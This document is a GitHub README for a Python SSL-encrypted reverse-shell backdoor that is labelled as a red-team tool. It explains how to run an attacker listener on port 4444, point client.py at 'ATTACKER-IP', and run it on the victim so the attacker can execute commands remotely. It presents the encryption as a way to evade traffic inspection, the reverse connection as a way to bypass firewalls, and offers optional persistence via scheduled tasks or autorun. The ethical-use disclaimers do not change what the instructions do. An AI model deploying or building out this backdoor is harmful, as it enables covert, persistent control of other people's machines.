# 🔐 SSL Encrypted Backdoor Tool

A powerful Python-based SSL-encrypted backdoor for secure remote shell access. Built for ethical red teaming, penetration testing, and research purposes only.

![Python](https://img.shields.io/badge/Python-3.10+-blue.svg)
![Security](https://img.shields.io/badge/Use-Ethical-red)
![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux-lightgrey)
![License](https://img.shields.io/badge/License-MIT-green)

---

## 🧠 Overview

This project implements a stealthy SSL-encrypted backdoor tool written in Python. It establishes a secure communication channel between a server (attacker) and a client (target) using SSL/TLS, providing command execution and remote shell capabilities.

- 🔒 **Secure Communication:** All data is encrypted using SSL to prevent traffic inspection.  
- ⚙️ **Cross-Platform Compatibility:** Works on both Windows and Linux systems.  
- 📡 **Simple Architecture:** Minimal dependencies and easy deployment.

> ⚠️ **Disclaimer:** This project is intended for educational and authorized penetration testing purposes only. Misuse of this tool is illegal and unethical.

---

## 📁 Project Structure

```
BACKDOOR/
├── server.py          # Listener/Handler running on the attacker machine
├── client.py          # Reverse backdoor that connects to attacker's server
├── cert.pem           # SSL certificate (for server)
├── key.pem            # SSL private key (for server)
└── README.md          # Documentation
```

---

## 🚀 Features

✅ SSL/TLS encrypted socket communication  
✅ Reverse shell functionality  
✅ Remote command execution  
✅ Dynamic client connection handling  
✅ Minimal footprint  

---

## ⚙️ Setup Instructions

### 🖥️ Server (Attacker)

Generate SSL Certificate (if not present):

```bash
openssl req -new -x509 -days 365 -nodes -out cert.pem -keyout key.pem
```

Run the Server Listener:

```bash
python server.py
```

You should see:

```
[+] Listening on 0.0.0.0:4444  
[+] Connection established with ('client-ip', port)  
Shell#
```

---

### 🖥️ Client (Victim)

Edit `client.py` and update with attacker IP:

```python
host = 'ATTACKER-IP'
port = 4444
```

Then run the client:

```bash
python client.py
```

Once executed, the client establishes an SSL connection back to the server and awaits commands.

---

## 🔧 Usage Example

1. Start `server.py` on the attacker machine.
2. Run `client.py` on the target machine.
3. Use the shell interface on the server to send commands:

```bash
Shell# whoami
Shell# ipconfig
Shell# dir
```

---

## 📌 How It Works

- **SSL Socket Wrapping:** Uses Python’s `ssl` module to wrap sockets with TLS encryption.  
- **Reverse Connection:** Client initiates the connection to bypass inbound firewall rules.  
- **Command Execution:** `subprocess.Popen` is used for shell command execution and output redirection.  
- **Persistence (Optional):** Can be configured as a scheduled task or autorun entry.

---

## 📦 Requirements

- Python 3.10+
- SSL Certificate (`cert.pem`, `key.pem`)
- OpenSSL (for certificate generation)

Install Python modules (uses built-in modules only):

```bash
pip install -r requirements.txt
```

📌 *Currently, no external Python packages are required.*

---

## 🛡 Ethical Usage

This tool was developed strictly for **educational**, **research**, and **authorized penetration testing**.  
🚫 Using this code for unauthorized access or malicious activity is a criminal offense.

---

## 🧑‍💻 Author

**Kasula Shiva**  
🎓 B.Tech CSE (Cybersecurity)  
🔗 GitHub: [shivakasula48](https://github.com/shivakasula48)  
📧 Email: [shivakasula10@gmail.com](mailto:shivakasula10@gmail.com)

---

## 📜 License

This project is licensed under the **MIT License**.  
Feel free to fork, modify, and use it for legitimate purposes.

---

## 📷 Screenshots

📡 Example Secure SSL Shell Prompt:

```
[+] Listening on 0.0.0.0:4444  
[+] Connection established with ('172.16.34.86', 49881)  
Shell# whoami  
Shell# dir  
```

---

## ⭐ Star the Repo

If you found this project useful or educational, consider giving it a ⭐ on GitHub!

---

## 📚 References

- [Python SSL Documentation](https://docs.python.org/3/library/ssl.html)
- Offensive Security Practices  
- Metasploit-style Reverse Shells
